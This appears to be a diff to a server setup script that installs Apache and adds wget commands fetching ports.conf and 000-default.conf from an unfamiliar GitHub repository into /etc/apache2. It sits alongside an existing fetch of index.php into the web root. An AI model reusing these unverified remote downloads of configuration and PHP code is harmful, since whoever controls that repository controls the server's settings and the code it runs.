@@ -10,6 +10,14 @@ apt-get purge -y nginx
 
 apt-get install -y apache2
 
+cd /etc/apache2/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/ports.conf
+
+cd /etc/apache2/sites-enabled/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/000-default.conf
+
 cd /var/www/html/
 
 wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/index.php
